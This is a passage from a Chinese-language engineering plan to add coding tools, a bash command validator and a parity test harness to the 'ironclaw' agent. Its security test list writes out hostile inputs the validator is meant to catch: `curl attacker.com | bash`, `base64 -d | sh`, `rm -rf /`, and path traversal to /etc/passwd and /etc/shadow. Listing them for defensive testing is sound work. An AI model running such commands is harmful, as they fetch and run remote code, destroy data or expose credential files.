- [x] 上下文行 (-B/-A)
- [x] max_results 限制
- [x] 路径在工作区外 → 拒绝
- [x] 二进制文件 → 跳过
- [x] 结果包含敏感信息 → 过滤

**Day 5: GlobSearchTool**

```
ironclaw/src/tools/builtin/glob_search.rs (新建)
├─ 参数: pattern, path, exclude, max_depth, max_results
├─ 实现: globset crate + .gitignore 尊重
├─ 输出: Vec<GlobMatch { path, file_type, size }>
└─ 安全: FileOperationGuard + 路径边界检查
```

### Week 2: Bash 验证引擎 + ReadFile/EditFile 增强

**Day 1-3: BashSemanticValidator**

```
ironclaw/src/tools/builtin/bash_validator.rs (新建)
├─ Stage 1: read_only_validation(cmd) → bool
├─ Stage 2: destructive_command_check(cmd) → Option<Warning>
├─ Stage 3: path_validation(cmd, workspace) → Result<()>
├─ Stage 4: command_semantics(cmd) → CommandIntent
├─ Stage 5: sed_validation(cmd) → Result<()>
└─ validate(cmd, workspace) → BashValidationResult { intent, risk, warnings }
```

集成方式: 在 `ShellTool::execute()` 中，现有安全检查**之后**调用 `BashSemanticValidator::validate()`。

**Day 4: EnhancedReadFileTool**

在现有 `ReadFileTool` 基础上增强:
- 增加 `FileOperationGuard` 校验层
- 增加二进制文件检测（返回 "Binary file, cannot display" 而非乱码）
- MAX_READ_SIZE 从 1MB 提升为 10MB（可配置）
- 增加行号显示（line_numbers: bool 参数）

**Day 5: CodeEditTool**

```
ironclaw/src/tools/builtin/code_edit.rs (新建)
├─ 参数: file_path, old_string, new_string, expected_count
├─ 实现: 搜索/替换 + 替换次数验证 + diff 生成
├─ 输出: EditResult { file_path, diff_preview, replaced_count }
└─ 与 ApplyPatchTool 共存，不替代
```

### P0 阶段交付物

| 交付物 | 验收标准 |
|--------|---------|
| **ToolFeatureFlags** | 执行拦截 + LLM 定义过滤 + Admin 可配置 |
| **前端 ToolUI spike** | makeAssistantToolUI 或回退方案验证通过 |
| FileOperationGuard | 所有文件工具经过双层路径校验 |
| GrepSearchTool | 正则搜索 + 上下文行 + ironclaw 安全管道 |
| GlobSearchTool | glob 匹配 + .gitignore 尊重 + 深度限制 |
| BashSemanticValidator | 5 阶段验证 + CommandIntent 分类 + ironclaw RiskLevel 映射 |
| Enhanced ReadFileTool | 二进制检测 + 10MB 限制 + 行号显示 |
| CodeEditTool | 搜索/替换 + diff 预览 + 多处替换验证 |
| Admin 策略 API | code-tools + workspace-paths + bash-rules |
| 前端 Renderer | FileEditRenderer + GrepResultRenderer + ShellOutputRenderer |
| 测试 | 单元 + 失败路径 + 安全审计 + 契约 |
| 文档 | 工具使用指南 + Admin 配置指南 |

---

## P1 阶段：LSP + Git + Prompt 重构（4 周）

### Week 3-4: LSP 集成

**LspRegistry 实现**:
```
ironclaw/src/tools/builtin/lsp/
├─ mod.rs           ← LspRegistry 全局单例
├─ client.rs        ← LSP JSON-RPC 客户端 (stdio transport)
├─ protocol.rs      ← LSP message types
├─ server_config.rs ← 语言 → 服务器映射
└─ tool.rs          ← LspQueryTool 实现
```

**语言服务器生命周期**:
1. LspQueryTool 首次调用某语言时，自动启动对应 LSP 服务器
2. 服务器进程由 ironclaw 管理（类似 MCP stdio transport）
3. 空闲超过 5 分钟自动关闭
4. Admin 白名单限制可用的 LSP 服务器

**前端**:
- `LspResultRenderer.tsx` — 定义/引用列表的代码预览
- `DiagnosticsBar.tsx` — LSP 诊断摘要集成到 WorkspaceTab

### Week 5-6: Git 集成 + Prompt 重构

**Git 工具实现**:
```
ironclaw/src/tools/builtin/git/
├─ mod.rs         ← Git 工具注册
├─ status.rs      ← GitStatusTool
├─ diff.rs        ← GitDiffTool  
├─ commit.rs      ← GitCommitTool
├─ branch.rs      ← GitBranchTool
├─ log.rs         ← GitLogTool
├─ stale.rs       ← GitStaleCheckTool
└─ push.rs        ← GitPushTool
```

**Prompt 分层重构**:
```
ironclaw/src/llm/prompt/
├─ mod.rs              ← LayeredPromptBuilder
├─ static_layer.rs     ← 静态层构建 + hash 计算
├─ dynamic_layer.rs    ← 动态层构建
├─ cache_control.rs    ← cache boundary 管理
└─ migration.rs        ← 从旧 reasoning.rs 迁移的兼容层
```

**前端**:
- `GitDiffRenderer.tsx` — unified diff 视图
- `GitStatusBar.tsx` — 侧边栏 Git 状态条
- `WorkspaceTab.tsx` — 项目总览页

### P1 阶段交付物

| 交付物 | 验收标准 |
|--------|---------|
| LspQueryTool | 7 种 LSP action + 自动语言检测 + Admin 白名单 |
| Git 工具套件(6) | 按风险分级 + DLP 扫描 commit msg + push 强制审批 |
| LayeredPromptBuilder | 静态/动态分层 + cache 命中率 > 80% |
| Admin 管控 API | LSP 白名单 + Git 仓库白名单 + 代码操作报表 |
| 前端组件 | Git/LSP renderer + WorkspaceTab |
| Prompt Cache 监控 | cache hit/miss 指标上报 |

---

## P2 阶段：高级能力 + Sub-Agent（4 周）

### Week 7-8: Plan Mode + Session Fork

**PlanModeTool 实现**:
```
ironclaw/src/tools/builtin/plan_mode.rs (新建)
├─ TogglePlanMode { thread_id } → PlanModeState
├─ 修改 ThreadState 枚举增加 Planning 状态
├─ Planning 状态下工具调用拦截逻辑
└─ PlanApproval { plan_id, action: Approve|Revise }
```

**SessionForkTool 实现**:
```
ironclaw/src/agent/session_fork.rs (新建)
├─ fork_thread(thread_id, at_turn) → new_thread_id
├─ 复制消息历史至指定 turn
├─ 复制已激活的 Skills/MCP 状态
└─ 不复制 pending approvals
```

### Week 9-10: Sub-Agent + 前端整合

**SubAgentTool 实现**: 基于现有 CreateJobTool, 增加 `JobMode::SubAgent`:

```rust
pub enum JobMode {
    Worker,       // 现有：完整 in-process agent
    ClaudeCode,   // 现有：外部 CLI 桥接 (P3 淘汰)
    SubAgent {    // 新增
        role: SubAgentRole,
        tool_whitelist: Vec<String>,
        max_turns: u16,
        inherit_context: bool,
    },
}

pub enum SubAgentRole {
    Explore,   // 只读搜索 + 代码理解
    Verify,    // 只读 + shell(只读命令)
    Custom(String),
}
```

**前端整合**:
- PlanRenderer — 集成到 ChatTabTauri
- Session Fork UI — 在消息气泡右键菜单 "Fork from here"
- Sub-Agent 进度 — 在 JobsPanel 显示子 Agent 状态

### P2 阶段交付物

| 交付物 | 验收标准 |
|--------|---------|
| PlanModeTool | Planning 状态切换 + 只读工具放行 + dry-run 预览 |
| SessionForkTool | 从任意 Turn 分叉 + 消息历史复制 + 独立演进 |
| SubAgentTool | Explore/Verify 角色 + depth=1 限制 + 工具白名单 |
| 前端 PlanRenderer | 步骤卡片 + Approve/Revise 交互 |
| 前端 Fork UI | 右键菜单 + 分支线程显示 |

---

## P3 阶段：Parity Harness + 回归防护（2 周）

### Week 11-12: 行为级 Parity 测试框架

**目标**: 建立自动化测试框架，**持续验证** ironclaw 的行为输出与 Claude Code 一致。

> **⚠️ 重要**: claw-code 已有一个成熟的 parity 测试 harness：
> `claw-code/rust/crates/rusty-claude-cli/tests/mock_parity_harness.rs`
> 包含 12 个确定性场景、`MockAnthropicService`（模拟 `/v1/messages`）、
> `HarnessWorkspace`（临时目录 + env 隔离）、`ScenarioReport`（JSON 输出）。
> **P3 的 Parity Harness 必须以此为起点**，而非从零设计。

#### 现有 mock_parity_harness 覆盖的 12 个场景

| # | 场景 | 覆盖范围 |
|---|------|---------|
| 1 | `streaming_text` | SSE 流式文本输出 |
| 2 | `read_file_roundtrip` | 文件读取端到端 |
| 3 | `grep_chunk_assembly` | grep 结果流式拼装 |
| 4 | `write_file_allowed` | 文件写入（已授权） |
| 5 | `write_file_denied` | 文件写入（被拒绝） |
| 6 | `multi_tool_turn_roundtrip` | 多工具单 turn |
| 7 | `bash_stdout_roundtrip` | Shell 命令执行 |
| 8 | `bash_permission_prompt_approved` | Shell 审批通过 |
| 9 | `bash_permission_prompt_denied` | Shell 审批拒绝 |
| 10 | `plugin_tool_roundtrip` | MCP 插件调用 |
| 11 | `auto_compact_triggered` | 自动压缩触发 |
| 12 | `token_cost_reporting` | Token/费用统计 |

#### 迁移策略：扩展而非重建

```
Phase 1: 移植 mock_parity_harness 基础设施
├─ MockAnthropicService → 适配 ironclaw 多后端路由
├─ HarnessWorkspace     → 复用 temp dir + env 隔离模式
├─ ScenarioCase/Run     → 扩展为支持 ironclaw 安全管道断言
└─ ScenarioReport       → 增加 DLP/审批/审计维度

Phase 2: 扩展场景至 30+
├─ 12 个原有场景（行为对齐验证）
├─ 8 个安全增强场景（DLP/审批/沙箱）
├─ 6 个新能力场景（LSP/Git/PlanMode/Fork/SubAgent）
└─ 4 个企业特有场景（Admin策略/Token配额/Fail-Safe）
```

**Parity Harness 架构**（基于现有 harness 扩展）:

```
┌─────────────────────────────────────────────────────┐
│              Parity Harness (扩展自 claw-code)       │
│                                                      │
│  ┌──────────────────┐   ┌──────────────────────┐    │
│  │ Scenario Files   │   │ MockAnthropicService  │    │
│  │                  │   │ (来自 claw-code,       │    │
│  │ 原有 12 场景     │   │  扩展多后端支持)       │    │
│  │ + 新增 18 场景   │   │                       │    │
│  │                  │   │ • 预设响应序列         │    │
│  │ • 安全管道场景   │   │ • 工具调用验证         │    │
│  │ • LSP/Git 场景   │   │ • 流式输出模拟         │    │
│  │ • Plan/Fork 场景 │   │ • DLP/审批模拟         │    │
│  │ • 企业策略场景   │   │                       │    │
│  └────────┬─────────┘   └──────────┬───────────┘    │
│           │                         │                │
│           ▼                         ▼                │
│  ┌──────────────────────────────────────────────┐   │
│  │     Test Runner (扩展自 HarnessWorkspace)     │   │
│  │                                               │   │
│  │ 1. 启动 MockAnthropicService                  │   │
│  │ 2. 启动 ironclaw engine (嵌入模式)            │   │
│  │ 3. 按场景注入用户消息                          │   │
│  │ 4. 捕获工具调用序列                            │   │
│  │ 5. 验证行为断言                                │   │
│  │    - 调用了哪些工具？顺序？参数？               │   │
│  │    - 安全检查是否触发？                         │   │
│  │    - 审批流程是否正确？                         │   │
│  │    - DLP 扫描/审计日志完整？                    │   │
│  │    - 最终输出是否合理？                         │   │
│  │ 6. 生成 ScenarioReport (扩展 JSON 格式)       │   │
│  └──────────────────────────────────────────────┘   │
└─────────────────────────────────────────────────────┘
```

**Parity Scenario 格式**:

```json
{
  "name": "file_edit_with_approval",
  "description": "Agent edits a file, requires approval, gets approved",
  "user_message": "Fix the typo in src/main.rs line 42",
  "mock_responses": [
    {
      "tool_calls": [
        { "name": "read_file", "input": { "file_path": "src/main.rs" } }
      ]
    },
    {
      "tool_calls": [
        { "name": "code_edit", "input": { "file_path": "src/main.rs", "old_string": "teh", "new_string": "the" } }
      ]
    },
    {
      "text": "I've fixed the typo on line 42."
    }
  ],
  "assertions": {
    "tools_called": ["read_file", "code_edit"],
    "approval_triggered": true,
    "approval_tool": "code_edit",
    "file_modified": "src/main.rs",
    "dlp_scanned": true,
    "audit_logged": true
  }
}
```

**淘汰 Claude Code 桥接**:
- P3 阶段完成后，所有 Parity Scenario 通过原生实现
- 将 `JobMode::ClaudeCode` 标记为 deprecated
- Feature flag `CLAUDE_CODE_BRIDGE_ENABLED=false` 默认关闭

---

# 第三部分：验收规范与 Parity Harness

## 1. 验收维度总览

```
┌─────────────────────────────────────────────────────────────┐
│                     验收维度矩阵                             │
│                                                             │
│  维度 1: 功能 Parity        ← 能做到 Claude Code 能做的事   │
│  维度 2: 安全 Parity        ← 安全性不低于 Claude Code      │
│  维度 3: 企业安全增强       ← 企业安全能力超越 Claude Code   │
│  维度 4: 性能 Parity        ← 响应速度不差于 Claude Code     │
│  维度 5: 前端可用性         ← 用户能通过 UI 使用所有能力     │
│  维度 6: 回归防护           ← 迁移不破坏现有功能             │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

## 2. 维度 1: 功能 Parity 验收

### 2.1 核心八件套 Parity

Claude Code 的"核心八件套"是其 Agent 能力的基石。每个工具必须在行为层面对齐。

| Claude Code 工具 | ironclaw 对应 | 行为 Parity 验收标准 |
|-----------------|--------------|---------------------|
| **BashTool** | ShellTool + BashSemanticValidator | ✅ 命令执行 + 超时 + 后台模式 + 5 阶段验证 |
| **FileReadTool** | ReadFileTool (enhanced) | ✅ 行号偏移 + limit + 二进制检测 + 10MB |
| **FileWriteTool** | WriteFileTool | ✅ 创建/覆盖 + 大小限制 + 目录自动创建 |
| **FileEditTool** | CodeEditTool | ✅ 搜索/替换 + 多处替换 + diff 预览 |
| **GlobTool** | GlobSearchTool | ✅ 模式匹配 + .gitignore + 排除模式 |
| **GrepTool** | GrepSearchTool | ✅ 正则 + 上下文行 + 分页 |
| **AgentTool** | SubAgentTool (Explore/Verify) | ✅ 子 Agent + 工具白名单 + depth=1 |
| **TodoWriteTool** | 现有 MemoryWriteTool | ✅ 结构化任务列表 (复用记忆系统) |

### 2.2 扩展能力 Parity

| Claude Code 能力 | ironclaw 对应 | 验收标准 |
|-----------------|--------------|---------|
| Plan Mode | PlanModeTool | 规划/执行模式切换 + 只读工具放行 + 计划审批 |
| Session Fork | SessionForkTool | 从任意 Turn 分叉 + 独立历史 |
| LSP 集成 | LspQueryTool | 7 种 action + 自动语言检测 |
| Git 操作 | Git 工具套件 | 状态/diff/commit/push + 风险分级 |
| Notebook | 路线图（P3+） | Jupyter cell 编辑 |
| Web Fetch | 现有 HttpTool | ✅ URL 获取 + 内容转换 |
| Web Search | 现有 HttpTool | ✅ 搜索 API 调用 |
| MCP | 现有 MCP 子系统 | ✅ 3 传输协议 + 完整生命周期 |
| REPL | 路线图（P3+） | 代码解释执行 |

### 2.3 功能 Parity 测试场景 (30 个)

```
P0 场景 (12):
├─ FP-001: 读取文件并显示行号
├─ FP-002: 搜索工作区中包含特定模式的文件
├─ FP-003: 使用 glob 查找特定类型文件
├─ FP-004: 编辑文件中的特定字符串
├─ FP-005: 编辑文件时检测二进制文件并拒绝
├─ FP-006: 读取超过 10MB 的文件被拒绝
├─ FP-007: Symlink 指向工作区外被拒绝
├─ FP-008: Shell 只读命令自动降级为 Low 风险
├─ FP-009: Shell 破坏性命令升级为 High + 需审批
├─ FP-010: Shell sed -i 命令触发 sedValidation
├─ FP-011: Shell 命令语义分类为 CommandIntent 各类型
├─ FP-012: grep 搜索结果包含前后上下文行

P1 场景 (10):
├─ FP-013: LSP 获取文件诊断信息
├─ FP-014: LSP 跳转到定义
├─ FP-015: LSP 查找引用
├─ FP-016: Git status 显示工作区状态
├─ FP-017: Git diff 显示文件变更
├─ FP-018: Git commit 自动触发 DLP 扫描 commit message
├─ FP-019: Git push 强制需要用户审批
├─ FP-020: Stale base 检测并建议 rebase
├─ FP-021: Prompt cache 命中率 > 80%
├─ FP-022: 动态层变化不破坏静态层缓存

P2 场景 (8):
├─ FP-023: 进入 Plan Mode 后只有只读工具可执行
├─ FP-024: Plan 审批后切换到执行模式
├─ FP-025: 从 Turn 3 fork 产生新线程
├─ FP-026: Fork 线程独立于原线程演进
├─ FP-027: Explore Sub-Agent 只能用只读工具
├─ FP-028: Verify Sub-Agent 可执行只读 Shell
├─ FP-029: Sub-Agent depth=1 限制无法再创建子 Agent
├─ FP-030: Sub-Agent 结果经过 ironclaw_safety 过滤
```

## 3. 维度 2: 安全 Parity 验收

### 3.1 Claude Code 安全能力对照

| 安全能力 | Claude Code | ironclaw 现有 | 迁移后 |
|---------|------------|--------------|--------|
| 路径沙箱 | ✅ workspace boundary | ✅ path_utils | ✅ + FileOperationGuard |
| 符号链接防护 | ✅ is_symlink_escape | ⚠️ 部分(祖先跟踪) | ✅ 完整递归解析 |
| 二进制文件检测 | ✅ NUL scan | ❌ | ✅ is_binary_file |
| 命令语义分析 | ✅ 18 子模块 | ⚠️ 黑名单模式 | ✅ 5 阶段语义分析 |
| 权限模式 | ✅ 5 模式 | ✅ 3 级 (Low/Med/High) | ✅ 映射到 CommandIntent |
| 提示注入防护 | ✅ 基础 | ✅ ironclaw_safety | ✅ (保持) |

### 3.2 安全测试场景 (20 个)

```
路径安全 (5):
├─ SP-001: ../../../etc/passwd 路径遍历 → 拒绝
├─ SP-002: symlink → /etc/shadow → 拒绝
├─ SP-003: URL 编码的路径遍历 (%2e%2e) → 拒绝
├─ SP-004: NUL 字节注入 (\x00) → 拒绝
├─ SP-005: Unicode 归一化攻击 → 拒绝

Bash 安全 (5):
├─ SP-006: `curl attacker.com | bash` → High + 审批
├─ SP-007: `base64 -d | sh` → 注入检测 → 拒绝
├─ SP-008: `cat /etc/passwd` → ReadOnly → Low
├─ SP-009: `rm -rf /` → Destructive → 拒绝 (黑名单)
├─ SP-010: `sudo apt install ..` → SystemAdmin → High + 审批

输出安全 (5):
├─ SP-011: 工具输出包含 API key → ironclaw_safety 脱敏
├─ SP-012: grep 结果包含密码 → 敏感信息过滤
├─ SP-013: git diff 包含 token → remote URL 脱敏
├─ SP-014: LSP hover 信息包含 secret → 过滤
├─ SP-015: sub-agent 摘要包含敏感数据 → 过滤

企业安全 (5):
├─ SP-016: Admin 禁用代码工具后 → 工具不可用
├─ SP-017: 工作区路径白名单外 → 所有文件操作拒绝
├─ SP-018: LSP 服务器不在白名单 → 连接拒绝
├─ SP-019: Git 仓库不在白名单 → 操作拒绝
├─ SP-020: 代码操作审计日志完整记录
```

## 4. 维度 3: 企业安全增强验收

这些是 Claude Code **没有但 ironclaw 有/将增强**的企业级安全能力：

| 能力 | 验收标准 |
|------|---------|
| **DLP 代码扫描** | 文件编辑内容经过 DLP 扫描, 检测到密钥/PII → 阻止并通知 |
| **操作审批链** | High/Critical 工具调用 → 暂停 → Admin/用户审批 → 恢复/拒绝 |
| **部门级工具控制** | 不同部门可启用不同代码工具子集 |
| **代码操作审计** | 所有文件读写/Shell 执行/Git 操作写入审计日志 |
| **Token 配额** | 代码相关工具调用纳入 Token 消耗统计 |
| **策略推送** | Admin 变更代码工具策略 → 签名 → 推送 → 客户端强制执行 |
| **Fail-Safe 设计** | DLP/审批/策略检查失败 → 拒绝操作（非允许） |

## 5. 维度 4: 性能 Parity 验收

| 指标 | Claude Code 参考 | 目标 | 测量方法 |
|------|-----------------|------|---------|
| Prompt cache 命中率 | ~92% | > 80% (P1), > 90% (P3) | cache_read_tokens / total_tokens |
| Token 效率 | 基准 | ≤ 110% of Claude Code | 相同任务的 total tokens 对比 |
| 首 token 延迟 | ~500ms | < 1s | 从用户发送到首个 token stream |
| 工具执行延迟 | ~100ms | < 200ms | 工具调用到结果返回 |
| grep 10K 文件 | ~2s | < 3s | 大型工作区 grep benchmark |
| LSP 启动 | ~3s | < 5s | 首次 LSP 查询冷启动 |
| Context compaction | 自动 | 自动 (现有) | 80% token 阈值触发 |

## 6. 维度 5: 前端可用性验收

### 6.1 用户旅程测试 (E2E)

```
Journey 1: 代码修复
1. 用户发送 "帮我修复 src/main.rs 第 42 行的编译错误"
2. 前端显示 Agent "正在分析..." 状态
3. Agent 调用 LSP → 前端显示诊断信息 (LspResultRenderer)
4. Agent 调用 ReadFile → 前端显示代码 (FileReadRenderer, 行号高亮)
5. Agent 进入 Plan Mode → 前端显示计划步骤 (PlanRenderer)
6. 用户点击 "Approve" → Agent 执行编辑
7. 前端显示 diff (FileEditRenderer, 绿/红行)
8. Agent 执行 cargo build → 前端显示终端输出 (ShellOutputRenderer)
9. Agent commit → 审批弹窗 → 用户批准 → 完成

Journey 2: 代码搜索
1. 用户发送 "找到所有使用 deprecated_function 的地方"
2. Agent 调用 GrepSearch → 前端显示搜索结果 (GrepResultRenderer)
3. 每个结果显示文件路径 + 行号 + 上下文代码
4. 用户点击结果 → 前端调用 ReadFile 显示完整文件

Journey 3: 项目概览
1. 用户切换到 Workspace Tab
2. 前端显示: 文件树 + Git 状态 + 诊断摘要
3. 红色 badge 显示 "3 errors, 12 warnings"
4. 用户点击 error → 展开显示详细诊断信息
5. Git 状态显示 "2 files modified, 1 untracked"

Journey 4: 分支探索
1. 用户在对话第 5 轮说 "等等，换个思路"
2. 用户右键 Turn 3 → "Fork from here" 
3. 前端创建新线程 tab, 显示 "Forked from Thread A @ Turn 3"
4. 用户继续在 fork 线程操作, 原线程不受影响

Journey 5: 子 Agent 协作
1. 用户发送 "重构 auth 模块"
2. Agent 启动 Explore Sub-Agent → 前端 JobsPanel 显示子任务
3. Explore 完成, 摘要出现在主对话中
4. Agent 基于摘要制定 Plan → PlanRenderer 显示步骤
5. 用户批准 → Agent 逐步执行, Sub-Agent 验证每步结果
```

### 6.2 UI 组件 Checklist

| 组件 | 必须通过 |
|------|---------|
| FileReadRenderer | 语法高亮 + 行号 + 长文件折叠 + 复制按钮 |
| FileEditRenderer | Inline diff + 添加/删除行着色 + Undo 按钮 |
| GrepResultRenderer | 文件分组 + 上下文行 + 匹配高亮 + 点击跳转 |
| GlobResultRenderer | 文件树 + 文件类型图标 + 大小显示 |
| ShellOutputRenderer | 终端风格 + exit code + stderr 红色 + 折叠 |
| GitDiffRenderer | Unified diff + 语法高亮 + 文件切换 |
| LspResultRenderer | 代码预览 + 位置信息 + 点击导航 |
| PlanRenderer | 步骤卡片 + 进度 + Approve/Revise 按钮 |
| WorkspaceTab | 文件树 + Git 状态 + 诊断摘要 + 按需加载 |
| Approval Dialog | 工具上下文 + 安全分析 + Modify & Approve |

## 7. 维度 6: 回归防护验收

### 7.1 现有功能不退化

| 现有能力 | 验证方法 | 通过标准 |
|---------|---------|---------|
| 多通道对话 | 现有 E2E 测试 | 100% 通过 |
| DLP 引擎 | 现有 DLP 测试套件 | 100% 通过 |
| 审批系统 | 现有审批测试 | 100% 通过 |
| WASM 扩展 | 现有扩展测试 | 100% 通过 |
| MCP 集成 | 现有 MCP 测试 | 100% 通过 |
| Docker 沙箱 | 现有沙箱测试 | 100% 通过 |
| Routine 引擎 | 现有 Routine 测试 | 100% 通过 |
| 记忆系统 | 现有记忆测试 | 100% 通过 |
| 密钥管理 | 现有密钥测试 | 100% 通过 |
| Managed Policy | 现有策略测试 | 100% 通过 |

### 7.2 编译与冒烟

```bash
# 每个 PR 必须通过
cargo build -p desktop-client          # 0 错误 0 警告
cargo test -p desktop-client           # 100% 通过
cargo test --test tauri_command_contract_tests  # IPC 契约
cargo test --lib engine_startup_tests  # 启动时序
cargo test -p ironclaw                 # ironclaw 引擎测试
cargo build -p admin-backend           # Admin 编译
cargo test -p admin-backend --test integration_smoke_tests  # Admin 冒烟
```

### 7.3 Parity Regression Suite

P3 阶段建立的 Parity Harness 在 CI 中持续运行：

```bash
# 30 个 Parity 场景全部通过
cargo test --test parity_harness -- --test-threads=1

# 输出 Parity Report
cargo test --test parity_harness -- --report json > parity-report.json

# Report 格式:
{
  "total_scenarios": 30,
  "passed": 30,
  "failed": 0,
  "parity_score": "100%",
  "cache_hit_rate": "91.3%",
  "avg_token_efficiency": "107%",
  "security_tests_passed": "20/20"
}
```

## 8. 阶段验收 Gate

### P0 Gate (交付 6 个工具 + 安全基础)

| 条件 | 通过标准 |
|------|---------|
| 新工具编译 | `cargo build` 0 错误 0 警告 |
| 新工具测试 | 单元 + 失败路径 + 安全审计全部通过 |
| 安全管道 | 所有新工具经过 DLP → 审批 → 审计链路 |
| 功能场景 | FP-001 ~ FP-012 全部通过 |
| 安全场景 | SP-001 ~ SP-010 全部通过 |
| 现有测试 | 全量回归 100% 通过 |
| 前端组件 | 3 个 Renderer 可用（FileEdit, Grep, Shell）|
| Admin API | 代码工具策略 + 工作区路径白名单可用 |
| 文档 | 工具使用指南 + Admin 配置文档 |

### P1 Gate (LSP + Git + Prompt 重构)

| 条件 | 通过标准 |
|------|---------|
| 新工具编译+测试 | 同 P0 标准 |
| LSP | 至少支持 Rust + TypeScript 语言服务器 |
| Git | 6 个 Git 工具全部可用 + 风险分级 |
| Prompt Cache | 命中率 > 80% (10 轮对话平均) |
| 功能场景 | FP-001 ~ FP-022 全部通过 |
| 安全场景 | SP-001 ~ SP-020 全部通过 |
| Admin | LSP/Git 白名单 + 代码操作报表可用 |
| 前端 | WorkspaceTab + GitDiffRenderer + LspRenderer 可用 |

### P2 Gate (Plan Mode + Sub-Agent)

| 条件 | 通过标准 |
|------|---------|
| Plan Mode | 规划/执行切换 + dry-run + 审批流程完整 |
| Session Fork | 分叉 + 独立演进 + 前端线程切换 |
| Sub-Agent | Explore + Verify 角色 + 安全管道集成 |
| 功能场景 | FP-001 ~ FP-030 全部通过 |
| E2E 旅程 | 5 个 User Journey 全部通过 |
| 前端 | PlanRenderer + Fork UI + Sub-Agent 进度 |

### P3 Gate (Parity 达标)

| 条件 | 通过标准 |
|------|---------|
| Parity Score | 30/30 场景通过 |
| Cache Hit Rate | > 90% |
| Token Efficiency | ≤ 110% of Claude Code |
| Security Score | 20/20 安全场景通过 |
| UI Completeness | 10/10 组件 Checklist |
| Regression | 100% 现有测试通过 |
| Claude Code Bridge | `JobMode::ClaudeCode` 可安全禁用 |
| 文档 | 完整的 Parity Report + Admin 运维手册 |

## 9. 风险与缓解

| 风险 | 影响 | 缓解 |
|------|------|------|
| Prompt 分层破坏现有模型兼容 | 非 Anthropic 模型不支持 cache_control | 仅 Anthropic 启用分层；其他模型降级为单层 |
| LSP 进程资源消耗 | 多语言 LSP 服务器占用大量内存 | 空闲超时 + 同时最多 2 个 LSP 进程 |
| BashSemanticValidator 误判 | 合法命令被错误分类 | 5 阶段可单独禁用 + Admin 白名单覆盖 |
| 前端渲染性能 | 大量 grep 结果/diff 渲染慢 | 虚拟列表 + 分页加载 + 折叠默认 |
| FileOperationGuard 兼容性 | 某些合法符号链接被拒绝 | 白名单机制 + 友好错误消息 |
| Sub-Agent 上下文泄漏 | 子 Agent 摘要可能泄漏主对话敏感信息 | 摘要经过 ironclaw_safety 过滤 |

## 10. 成功指标

| 指标 | P0 目标 | P1 目标 | P2 目标 | P3 目标 |
|------|--------|--------|--------|--------|
| 功能 Parity 场景通过率 | 12/12 | 22/22 | 30/30 | 30/30 |
| 安全测试通过率 | 10/10 | 20/20 | 20/20 | 20/20 |
| Prompt Cache 命中率 | N/A | > 80% | > 85% | > 90% |
| 前端组件完成率 | 3/10 | 7/10 | 10/10 | 10/10 |
| 回归测试通过率 | 100% | 100% | 100% | 100% |
| `cargo build` 零警告 | ✅ | ✅ | ✅ | ✅ |

---

## 附录 A: 工具注册清单（新增）

以下工具需要添加到 `ironclaw/src/tools/builtin/mod.rs` 的注册列表，以及 `all_tauri_commands!()` 宏（如有 IPC 包装）：

```
P0:
  GrepSearchTool     → grep_search.rs
  GlobSearchTool     → glob_search.rs
  CodeEditTool       → code_edit.rs
  (ReadFileTool)     → file.rs (原地增强)
  (ShellTool)        → shell.rs (叠加 BashSemanticValidator)

P1:
  LspQueryTool       → lsp/tool.rs
  GitStatusTool      → git/status.rs
  GitDiffTool        → git/diff.rs
  GitCommitTool      → git/commit.rs
  GitBranchTool      → git/branch.rs
  GitLogTool         → git/log.rs
  GitPushTool        → git/push.rs
  GitStaleCheckTool  → git/stale.rs

P2:
  PlanModeTool       → plan_mode.rs
  SessionForkTool    → (agent/session_fork.rs)
  SubAgentTool       → (扩展 CreateJobTool)
```

## 附录 B: 前端组件文件清单（新增）

```
src-ui/src/app/components/
├── assistant-ui/
│   ├── tool-renderers/
│   │   ├── index.ts                    ← 统一导出
│   │   ├── FileReadRenderer.tsx        ← P0
│   │   ├── FileEditRenderer.tsx        ← P0
│   │   ├── GrepResultRenderer.tsx      ← P0
│   │   ├── GlobResultRenderer.tsx      ← P0
│   │   ├── ShellOutputRenderer.tsx     ← P0
│   │   ├── GitDiffRenderer.tsx         ← P1
│   │   ├── LspResultRenderer.tsx       ← P1
│   │   └── PlanRenderer.tsx            ← P2
│   └── tool-result-router.tsx          ← 根据 tool_name 分发 (P0)
├── tabs/
│   └── WorkspaceTab.tsx                ← P1
│       ├── FileTreeView.tsx
│       ├── GitStatusBar.tsx
│       └── DiagnosticsBar.tsx
└── main/
    └── ApprovalDialogEnhanced.tsx      ← P0 (增强现有)
```

## 附录 C: claw-code 源文件 → ironclaw 映射

| claw-code 源 | ironclaw 目标 | 迁移方式 |
|-------------|--------------|---------|
| `runtime/src/file_ops.rs` (744 LOC) | `tools/builtin/file_guard.rs` + 增强 `file.rs` | Clean-room：提取安全逻辑，不复制 I/O 实现 |
| `runtime/src/bash_validation.rs` (1004 LOC) | `tools/builtin/bash_validator.rs` | Clean-room：提取 5 阶段管道，适配 ironclaw RiskLevel |
| `runtime/src/lsp_client.rs` (461 LOC) | `tools/builtin/lsp/` | Clean-room：提取 LspAction/Registry 模式 |
| `runtime/src/permission_enforcer.rs` (357 LOC) | 不迁移 — ironclaw Approval 系统更完整 | Skip |
| `runtime/src/task_registry.rs` (335 LOC) | 不迁移 — ironclaw Job 系统更完整 | Skip |
| `runtime/src/team_cron_registry.rs` (441 LOC) | 不迁移 — ironclaw Routine 引擎更完整 | Skip |
| `tools/src/lib.rs` (EnterPlanMode) | `tools/builtin/plan_mode.rs` | 重新设计：扩展 ThreadState |
| `tools/src/lib.rs` (Agent) | 扩展 CreateJobTool + SubAgentRole | 重新设计：复用 Job 基础设施 |
| `runtime/src/conversation.rs` | CompactService + SSE 事件增强 | 参考：PromptCacheEvent miss 检测 + AssistantEvent 类型化 |
| `runtime/src/compact.rs` | CompactService 增强 | 移植：XML 清理 + preserve_recent + 续接提示词 |
| `runtime/src/prompt.rs` | `llm/prompt/` 分层架构 | 参考：SYSTEM_PROMPT_DYNAMIC_BOUNDARY + instruction 限制 |
| `runtime/src/hooks.rs` | 安全管道扩展层 | 新设计：Pre/Post Hook 在 DLP 管道中的插入点 |
| `runtime/src/worker_boot.rs` | SubAgent 生命周期 | 参考：6 态状态机 + 5 类失败 |
| `runtime/src/recovery_recipes.rs` | self-repair 策略库 | 移植：7 恢复策略 → RecoveryRecipe trait |
| `runtime/src/lane_events.rs` | Job/SubAgent 事件系统 | 参考：20+ 事件类型 + 12 失败分类 |
| `runtime/src/policy_engine.rs` | Routine 引擎升级（P3+） | 参考：PolicyRule/Condition/Action 模型 |
